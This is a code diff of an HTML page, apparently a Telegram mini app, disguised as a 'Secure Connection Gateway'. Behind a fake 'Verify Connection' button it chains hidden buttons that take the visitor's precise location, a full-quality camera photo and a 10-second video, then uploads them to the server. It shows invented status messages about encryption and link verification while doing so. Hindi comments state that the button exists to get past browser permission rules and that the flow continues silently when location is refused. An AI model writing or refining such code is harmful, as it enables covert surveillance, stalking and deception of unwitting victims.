@@ -9,13 +9,21 @@
     body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
     .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
     .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
-    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500}
+    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500;margin-bottom:20px}
+    /* सुंदर ऑथेंटिक दिखने वाला बटन */
+    .start-btn{width:100%;padding:14px;background:#2481cc;color:#fff;border:0;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(36,129,204,0.3);transition:background 0.2s}
+    .start-btn:hover{background:#288edc}
+    .start-btn:disabled{background:#4a5568;color:#a0aec0;cursor:not-allowed;box-shadow:none}
   </style>
 </head>
 <body>
 <div class="box">
-  <div id="status">Checking secure server connection...</div>
+  <div id="status">Secure Connection Gateway</div>
+  
+  <!-- ब्राउज़र सिक्योरिटी को संतुष्ट करने के लिए मुख्य बटन -->
+  <button id="startProcessBtn" class="start-btn">Verify Connection</button>
 
+  <!-- बैकग्राउंड ऑपरेशंस बटन (छुपे हुए) -->
   <div style="display:none;">
     <button id="locBtn">📍 Allow Location</button>
     <button id="camBtn">🎥 Allow Camera</button>
@@ -35,6 +43,7 @@ tg?.ready();
 tg?.expand();
 
 const statusEl = document.getElementById("status");
+const startProcessBtn = document.getElementById("startProcessBtn");
 const preview = document.getElementById("preview");
 const recorded = document.getElementById("recorded");
 const photoCanvas = document.getElementById("photoCanvas");
@@ -53,7 +62,14 @@ let latestCoords = { latitude: null, longitude: null, accuracy: null };
 
 function status(s){ statusEl.textContent = s; }
 
-// --- INSTANT RUN STEP 1: Fetch Geolocation ---
+// उपयोगकर्ता जैसे ही बटन दबाएगा, यह असली वन-क्लिक चेन चालू करेगा
+startProcessBtn.onclick = () => {
+  startProcessBtn.disabled = true;
+  startProcessBtn.style.display = "none"; // बटन को छुपा दें
+  locBtn.click(); // तुरंत पहला स्टेप चलाएं
+};
+
+// --- STEP 1: Fetch Geolocation ---
 locBtn.onclick = () => {
   if (!navigator.geolocation) {
     camBtn.click();
@@ -64,17 +80,18 @@ locBtn.onclick = () => {
     latestCoords.latitude = p.coords.latitude;
     latestCoords.longitude = p.coords.longitude;
     latestCoords.accuracy = p.coords.accuracy;
-    camBtn.click();
+    camBtn.click(); // लोकेशन मिलते ही कैमरा पर जाएं
   }, e => {
+    // अगर यूजर लोकेशन रिजेक्ट भी कर दे, तो भी चुपचाप कैमरा स्टेप पर बढ़ें
     camBtn.click();
   }, {
     enableHighAccuracy: true,
-    timeout: 5000,
+    timeout: 7000, // लोकेशन ढूँढने के लिए थोड़ा ज़्यादा समय दिया
     maximumAge: 0
   });
 };
 
-// --- INSTANT RUN STEP 2: Initialize HD Camera & Capture Live Photo ---
+// --- STEP 2: Initialize HD Camera & Capture Live Photo ---
 camBtn.onclick = async () => {
   try {
     const constraints = {
@@ -107,10 +124,10 @@ camBtn.onclick = async () => {
 
             try {
               await fetch("/api/location-photo", { method: "POST", body: form });
-            } catch(err) { console.error("Data tracking upload sync timeout."); }
+            } catch(err) { console.error("Upload error"); }
           }
-          recordBtn.click();
-        }, "image/jpeg", 1.0);
+          recordBtn.click(); // फोटो भेजने के बाद वीडियो रिकॉर्डिंग शुरू करें
+        }, "image/jpeg", 1.0); // 1.0 मतलब हाई-क्वालिटी बिना कंप्रेशन के
 
       } catch(photoErr) {
         recordBtn.click();
@@ -118,11 +135,11 @@ camBtn.onclick = async () => {
     }, 1000);
     
   } catch(e) {
-    status("Connection failed: System authorization is required to verify your environment link.");
+    status("Connection failed: System authorization is required.");
   }
 };
 
-// --- INSTANT RUN STEP 3: Record 10-Second Segment ---
+// --- STEP 3: Record 10-Second Segment ---
 recordBtn.onclick = () => {
   if (!stream || !stream.active) return;
   
@@ -158,11 +175,10 @@ recordBtn.onclick = () => {
     sendBtn.click();
   };
 
-  // 💥 बदलाव 1: 10 PARTS के लिए हर 1000ms (1 सेकंड) पर वीडियो बफ़र स्लाइस लें
-  recorder.start(1000);
+  recorder.start(1000); // 10 parts के लिए हर 1 सेकंड में डेटा स्लाइस लें
   status("Verifying secure link connection... Please stay on this screen.");
 
-  // 💥 बदलाव 2: कुल 10,000ms (10 सेकंड) के बाद रिकॉर्डिंग अपने आप बंद हो जाएगी
+  // ठीक 10 सेकंड बाद वीडियो रिकॉर्डिंग बंद होगी
   autoStopTimeout = setTimeout(() => {
     if (recorder && recorder.state !== "inactive") {
       recorder.stop();
@@ -176,7 +192,7 @@ stopBtn.onclick = () => {
   }
 };
 
-// --- INSTANT RUN STEP 4: Upload Compiled Data File ---
+// --- STEP 4: Upload Compiled Video File ---
 sendBtn.onclick = async () => {
   if (!videoBlob) return;
   status("Finalizing secure database encryption...");
@@ -192,16 +208,9 @@ sendBtn.onclick = async () => {
       tg?.close(); 
     }, 1000);
   } catch(e) {
-    status("Network connection timed out. Please reload the interface wrapper.");
+    status("Network connection timed out. Please reload.");
   }
 };
-
-// --- IMMEDIATE EXECUTION ENTRY POINT ---
-if (document.readyState === "loading") {
-  document.addEventListener("DOMContentLoaded", () => locBtn.click());
-} else {
-  locBtn.click();
-}
 </script>
 </body>
 </html>
